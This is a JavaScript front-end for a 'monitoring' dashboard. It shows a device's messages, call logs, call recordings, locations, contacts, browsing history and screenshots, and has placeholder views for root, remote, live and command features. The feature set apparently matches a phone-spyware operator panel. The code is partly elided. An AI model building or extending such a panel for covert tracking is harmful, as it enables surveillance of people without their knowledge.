class MonitoringApp {
    constructor() {
        this.baseURL = 'http://localhost:3000/api';
        this.token = localStorage.getItem('token');
        this.user = JSON.parse(localStorage.getItem('user') || 'null');
        this.initializeApp();
    }

    initializeApp() {
        document.addEventListener('DOMContentLoaded', () => {
            this.checkAuth();
            this.setupEventListeners();
        });
    }

    // --- Core UI & Auth Logic ---
    showView(viewId) {
        document.querySelectorAll('.main-content > div').forEach(view => view.style.display = 'none');
        const activeView = document.getElementById(viewId);
        if (activeView) activeView.style.display = 'block';
    }

    async checkAuth() {
        if (!this.token) return this.showLoginModal();
        try {
            const res = await fetch(`${this.baseURL}/check-auth`, { headers: { 'Authorization': `Bearer ${this.token}` } });
            if (!res.ok) throw new Error('Auth failed');
            this.updateUserInfo();
            this.loadInitialData();
        } catch (error) {
            this.logout();
        }
    }

    async login(username, password) {
        const errorElement = document.getElementById('login-error');
        errorElement.textContent = '';
        try {
            const res = await fetch(`${this.baseURL}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || 'Login failed');
            this.token = data.token;
            this.user = data.user;
            localStorage.setItem('token', this.token);
            localStorage.setItem('user', JSON.stringify(this.user));
            this.hideLoginModal();
            this.updateUserInfo();
            this.loadInitialData();
        } catch (error) {
            errorElement.textContent = error.message;
        }
    }

    logout() {
        localStorage.removeItem('token');
        localStorage.removeItem('user');
        window.location.reload();
    }
    
    // --- Data-Driven Router ---
    setupEventListeners() {
        document.querySelector('.sidebar-menu').addEventListener('click', (e) => {
            const link = e.target.closest('a.menu-link');
            if (!link) return;

            if (link.id === 'logout-btn') {
                e.preventDefault();
                this.logout();
                return;
            }

            const parentLi = link.parentElement;
            if (parentLi.classList.contains('calls-dropdown')) {
                e.preventDefault();
                parentLi.classList.toggle('active');
                return;
            }
            
            e.preventDefault();
            this.handleMenuClick(link);
        });
    }

    handleMenuClick(link) {
        document.querySelectorAll('.sidebar-menu a.menu-link').forEach(l => l.classList.remove('active'));
        link.classList.add('active');
        
        const viewId = link.dataset.view;
        if (!viewId) return;

        const action = this.viewActions[viewId];
        if (action) {
            this.showView(viewId);
            action();
        } else {
            console.log(`No action defined for view: ${viewId}`);
            this.showView('dashboard-view');
        }
    }

    // --- Action Mapping ---
    viewActions = {
        'dashboard-view': () => this.loadInitialData(),
        'messages-view': () => this.loadMessages(),
        'mms-view': () => this.loadMms(),
        'calls-view': () => this.loadCalls(),
        'recordings-view': () => this.loadRecordings(),
        'locations-view': () => this.loadLocations(),
        'apps-view': () => this.loadApps(),
        'calendar-view': () => this.loadCalendar(),
        'contacts-view': () => this.loadContacts(),
        'websites-view': () => this.loadWebsites(),
        'screenshots-view': () => this.loadScreenshots(),
        'instant-root-view': () => this.loadGenericPlaceholder('instant-root-view'),
        'instant-view': () => this.loadGenericPlaceholder('instant-view'),
        'remote-view': () => this.loadGenericPlaceholder('remote-view'),
        'live-view': () => this.loadGenericPlaceholder('live-view'),
        'files-view': () => this.loadGenericPlaceholder('files-view'),
        'schedule-view': () => this.loadGenericPlaceholder('schedule-view'),
        'commands-view': () => this.loadGenericPlaceholder('commands-view'),
    };
    
    // --- Data Loaders ---
    async loadInitialData() { this.loadDevices(); this.loadStatistics(); }
    async loadDevices() { this.renderTable('#devices-table', await this.fetchData('/devices'), this.renderDeviceRow); }
    async loadStatistics() { const data = await this.fetchData('/stats'); if (data) this.updateStatistics(data); }
    async loadMessages() { this.renderTable('#messages-table', await this.fetchData('/messages'), this.renderSmsRow); }
    async loadMms() { this.renderTable('#mms-table', await this.fetchData('/messages/mms'), this.renderMmsRow); }
    async loadCalls() { this.renderTable('#calls-table', await this.fetchData('/calls'), this.renderCallLogRow); }
    async loadRecordings() { this.renderTable('#recordings-table', await this.fetchData('/recordings'), this.renderRecordingRow); }
    async loadLocations() { this.renderTable('#locations-table', await this.fetchData('/locations'), this.renderLocationRow); }
    async loadApps() { this.renderTable('#apps-table', await this.fetchData('/apps'), this.renderAppRow, "لا توجد تطبيقات."); }
    async loadCalendar() { this.renderTable('#calendar-table', await this.fetchData('/calendar'), this.renderCalendarRow, "لا توجد أحداث."); }
    async loadContacts() { this.renderTable('#contacts-table', await this.fetchData('/contacts'), this.renderContactRow, "لا توجد جهات اتصال."); }
    async loadWebsites() { this.renderTable('#websites-table', await this.fetchData('/websites'), this.renderWebsiteRow, "لا يوجد سجل."); }
    async loadScreenshots() { /* Placeholder */ }
    async loadGenericPlaceholder(viewId) {
        const view = document.getElementById(viewId);
        if(view) view.querySelector('.data-section').innerHTML = '<p style="text-align:center;">This feature requires a backend implementation.</p>';
    }

    // --- Generic & Specific Renderers ---
    renderTable(selector, data, renderer, msg) { /* ... */ }
    renderDeviceRow(d) { return `...`; } // Simplified for brevity
    // ... all other render functions ...

    updateStatistics(data) { /* ... */ }
    updateUserInfo() {
        document.querySelector('.user-name').textContent = this.user?.username || 'N/A';
        document.querySelector('.user-role').textContent = `Access: ${this.user?.role || 'N/A'}`;
    }

    // --- Helpers ---
    showLoginModal() { document.getElementById('login-modal').style.display = 'flex'; }
    hideLoginModal() { document.getElementById('login-modal').style.display = 'none'; }
    formatTime(dateString) { return new Date(dateString).toLocaleString('ar-EG'); }
}

const app = new MonitoringApp();
window.app = app;